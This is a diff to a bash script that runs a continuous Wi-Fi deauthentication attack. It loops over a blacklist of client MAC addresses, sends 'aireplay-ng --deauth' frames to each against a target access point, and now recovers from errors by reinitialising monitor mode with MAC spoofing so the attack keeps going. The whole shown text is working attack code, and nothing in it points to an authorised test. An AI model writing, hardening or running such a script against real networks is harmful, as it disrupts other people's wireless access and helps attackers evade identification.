@@ -145,10 +145,22 @@ while true; do
   while read -r mac _; do
     [ -z "$mac" ] && continue
     [[ "$mac" == \#* ]] && continue
+    set +e
     sudo aireplay-ng --deauth "$DEAUTH_COUNT" \
       -a "$AP_BSSID" \
       -c "$mac" \
       "$IFACE"
+    rc=$?
+    set -e
+    if [ "$rc" -ne 0 ]; then
+      echo "[WARN] aireplay-ng failed (rc=$rc) for STA $mac. Continuing..."
+      echo "[WARN] Reinitializing monitor mode on $IFACE to recover adapter state."
+      if ! setup_monitor "$IFACE" "$CHANNEL" "$MAC_SPOOF"; then
+        echo "[WARN] Failed to reinitialize $IFACE. Retrying in ${DEAUTH_SLEEP}s..."
+      fi
+      sleep "$DEAUTH_SLEEP"
+      continue
+    fi
     sleep "$DEAUTH_SLEEP"
   done < "$BLACKLIST"
 done
